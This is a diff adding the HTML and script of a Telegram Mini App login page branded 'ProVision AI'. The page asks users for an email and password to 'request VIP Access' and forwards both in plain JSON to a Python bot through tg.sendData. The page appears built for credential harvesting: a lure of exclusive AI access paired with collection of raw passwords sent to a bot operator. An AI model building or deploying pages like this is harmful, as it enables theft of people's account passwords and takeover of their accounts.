@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ProVision AI Login</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            background-color: #0f172a; /* Dark Slate */
+            color: #ffffff;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            width: 80%;
+            max-width: 350px;
+            text-align: center;
+            border: 1px solid #334155;
+        }
+        h2 {
+            color: #00ff88; /* Neon Green */
+            margin-bottom: 5px;
+        }
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #334155;
+            background: #0f172a;
+            color: white;
+            border-radius: 8px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #00ff88;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #00ff88;
+            color: #0f172a;
+            font-weight: bold;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #00cc6a;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>⚙️ ProVision AI</h2>
+        <p>Enter credentials to request VIP Access</p>
+        
+        <input type="email" id="email" placeholder="Enter Email Address" required>
+        <input type="password" id="password" placeholder="Enter Secure Password" required>
+        
+        <button onclick="submitData()">Request Access</button>
+    </div>
+
+    <script>
+        // Telegram Web App ko initialize karna
+        let tg = window.Telegram.WebApp;
+        tg.expand(); // App ko full screen karta hai
+
+        function submitData() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (email === "" || password === "") {
+                tg.showAlert("Please fill both Email and Password.");
+                return;
+            }
+
+            // Data ko JSON format mein pack karke Python bot ko bhejna
+            let data = {
+                email: email,
+                password: password
+            };
+
+            tg.sendData(JSON.stringify(data));
+            tg.close(); // Submit hote hi Mini App band ho jayegi
+        }
+    </script>
+</body>
+</html>
